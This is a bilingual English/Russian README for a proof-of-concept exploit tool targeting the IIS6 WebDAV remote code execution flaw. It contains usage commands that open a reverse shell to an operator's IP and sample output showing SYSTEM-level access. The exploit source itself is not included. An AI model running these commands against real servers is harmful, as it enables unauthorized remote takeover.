
# EN
**GenWebDavIISExploit** is a PoC tool demonstrating an exploit for a known vulnerability in the WebDAV component of IIS6. This tool is designed for educational and research purposes to showcase how the vulnerability can be leveraged to execute arbitrary code on a remote server.

## Disclaimer

This project is intended for **educational purposes only**. Use this tool responsibly and only on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.

## Features

- Remote code execution on vulnerable IIS6 WebDAV servers.
- Dynamic payload generation with user-specified reverse IP and port.
- Easy-to-use command-line interface for rapid exploitation.

## Prerequisites

- **Python 3.x**: Ensure that Python 3 is installed on your system.
- **Network Access**: Ability to connect to the target machine's IP and port.

## Usage
### Command-Line Arguments

- **Target IP**: The IP address of the target IIS6 WebDAV server.
- **Target Port**: The port number on which the WebDAV service is running (usually 80).
- **Reverse IP**: Your IP address where the reverse shell should connect.
- **Reverse Port**: The port number on your system to receive the reverse shell.

## Example

```bash
python3 GenWebDavIISExploit.py <target_ip> <target_port> <reverse_ip> <reverse_port>
```

## Usage Example

```bash
python3 GenWebDavIISExploit.py 192.168.1.10 80 192.168.1.5 4444
```

## Example output
```
$ python3 GenWebDavIISExploit.py 192.168.1.10 80 192.168.1.5 4444

[*] Подключение к цели 192.168.1.10 на порту 80...
[*] Отправка специально сформированного HTTP-запроса для эксплуатации уязвимости...
[*] Длина полезной нагрузки: 1744 байт
[*] Ожидание обратного соединения...

[+] Ответ от цели:
HTTP/1.1 200 OK
Content-Length: 123
Server: Microsoft-IIS/6.0

[+] Получено обратное соединение от 192.168.1.10:12345
[+] Удаленный доступ успешно установлен!

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> ipconfig
Настройка IP Windows

   Адаптер Ethernet Local Area Connection:
      DNS-суффикс подключения . . . . . : example.local
      IPv4-адрес. . . . . . . . . . . . : 192.168.1.10
      Маска подсети . . . . . . . . . . : 255.255.255.0
      Основной шлюз . . . . . . . . . . : 192.168.1.1
    
```


## Notes
- Ensure you have a listener running on the specified reverse port to capture the incoming reverse shell.
- Use this tool only on authorized systems to test for vulnerabilities.


# RU
**GenWebDavIISExploit** - это PoC-инструмент, демонстрирующий эксплуатацию известной уязвимости в компоненте WebDAV на IIS6. Этот инструмент создан в образовательных и исследовательских целях, чтобы показать, как уязвимость может быть использована для выполнения произвольного кода на удаленном сервере.


## Отказ от ответственности

Этот проект предназначен **только для образовательных целей**. Используйте этот инструмент ответственно и только на системах, которые вы владеете или имеете явное разрешение для тестирования. Несанкционированный доступ к компьютерным системам является незаконным.

## Особенности

- Выполнение удаленного кода на уязвимых серверах IIS6 WebDAV.
- Генерация динамического полезного кода с указанием IP и порта для обратного соединения.
- Простой интерфейс командной строки для быстрого использования.

## Требования

- **Python 3.x**: Убедитесь, что у вас установлен Python 3.
- **Доступ к сети**: Возможность подключаться к IP-адресу и порту целевой машины.


## Использование

### Аргументы командной строки

- **Target IP**: IP-адрес целевого сервера IIS6 WebDAV.
- **Target Port**: Номер порта, на котором работает служба WebDAV (обычно 80).
- **Reverse IP**: Ваш IP-адрес, на который должно быть установлено обратное соединение.
- **Reverse Port**: Номер порта на вашей системе для получения обратного соединения.

## Пример

```bash
python3 GenWebDavIISExploit.py <target_ip> <target_port> <reverse_ip> <reverse_port>
```

## Пример использования

```bash
python3 GenWebDavIISExploit.py 192.168.1.10 80 192.168.1.5 4444
```

## Пример вывода
```
$ python3 GenWebDavIISExploit.py 192.168.1.10 80 192.168.1.5 4444

[*] Подключение к цели 192.168.1.10 на порту 80...
[*] Отправка специально сформированного HTTP-запроса для эксплуатации уязвимости...
[*] Длина полезной нагрузки: 1744 байт
[*] Ожидание обратного соединения...

[+] Ответ от цели:
HTTP/1.1 200 OK
Content-Length: 123
Server: Microsoft-IIS/6.0

[+] Получено обратное соединение от 192.168.1.10:12345
[+] Удаленный доступ успешно установлен!

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> ipconfig
Настройка IP Windows

   Адаптер Ethernet Local Area Connection:
      DNS-суффикс подключения . . . . . : example.local
      IPv4-адрес. . . . . . . . . . . . : 192.168.1.10
      Маска подсети . . . . . . . . . . : 255.255.255.0
      Основной шлюз . . . . . . . . . . : 192.168.1.1
    
```


## Заметки

- Убедитесь, что у вас запущен прослушиватель на указанном обратном порту для перехвата входящего обратного соединения.
- Используйте этот инструмент только на авторизованных системах для проверки на наличие уязвимостей.

